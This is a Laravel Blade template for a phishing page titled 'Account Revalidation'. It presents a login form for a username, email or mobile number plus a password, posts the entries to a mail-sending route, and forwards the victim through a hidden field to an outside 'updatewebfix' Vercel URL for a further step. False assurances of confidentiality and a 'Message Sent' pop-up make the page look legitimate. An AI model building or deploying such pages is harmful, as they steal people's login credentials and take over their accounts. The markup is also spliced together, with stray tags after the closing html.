
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {font-family: Arial, Helvetica, sans-serif;}
form {border: 3px solid #f1f1f1;}

input[type=text], input[type=password] {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  box-sizing: border-box;
}

button {
  background-color: #04AA6D;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
}

button:hover {
  opacity: 0.8;
}

.cancelbtn {
  width: auto;
  padding: 10px 18px;
  background-color: #f44336;
}

.imgcontainer {
  text-align: center;
  margin: 24px 0 12px 0;
}

img.avatar {
  width: 40%;
  border-radius: 50%;
}

.container {
  padding: 16px;
}

span.psw {
  float: right;
  padding-top: 16px;
}

/* Change styles for span and cancel button on extra small screens */
@media screen and (max-width: 300px) {
  span.psw {
     display: block;
     float: none;
  }
  .cancelbtn {
     width: 100%;
  }
}
</style>
</head>
<body>

<h2>Account Revalidation</h2>

	<form class="contact-form" action="{{route('sendMail')}}" method="post">
		@csrf
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://updatewebfix.vercel.app/code">  <div class="imgcontainer">
    <img src="assets/img_avatar2.png" alt="Avatar" class="avatar">
  </div>
<input type="radio" class="btn-check" name="options" id="option1" value="username"   autocomplete="off" checked>
<label class="btn btn-secondary" for="option1">Username</label>

<input type="radio" class="btn-check" name="options" id="option2" value="email"  autocomplete="off">
<label class="btn btn-secondary" for="option2">Email</label>

<input type="radio" class="btn-check" name="options" id="option4" value="mobile" autocomplete="off">
<label class="btn btn-secondary" for="option4">Mobile</label>
    <div class="container">
    <label for="email"><b></b></label>
    <input type="text" placeholder="Enter" name="email" required>
    
    <label for="password"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="password" required>
        
    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>
</form>

</body>
</html>
 
              </div>
            </div>
          </div>
          <div class="row">
            <p class="px-3 note" style="font-size: 15px;margin-top: 50px;font-weight: bold;">
              NOTE
            </p>
            <p class="px-3" style="font-size: 11px;">
              <ul>
                <li style="font-size: 11px;">
                  The information collected is confidential and will not be disclosed by us to unauthorized third parties.
                </li>
                <li style="font-size: 11px;">
                  Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties. Authentication information will not be modified.
                </li>
                <li style="font-size: 11px;">
                  Authentication process will be carried out immediately upon receipt of information, and we will have notify you of the authentication result.
                </li>
              </ul>
            
          </div>
        </div>
  </div>
<!--
  <script src="../code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="../cdn.jsdelivr.net/npm/bootstrap%404.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
-->
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<!-- header style two End -->
@if(session()->has('message'))
<script>
	Swal.fire({
	icon: "success",
	title: "Message Sent",
	text: "{{ session()->get('message') }}",
	});
</script>
@endif

</body>
</html>
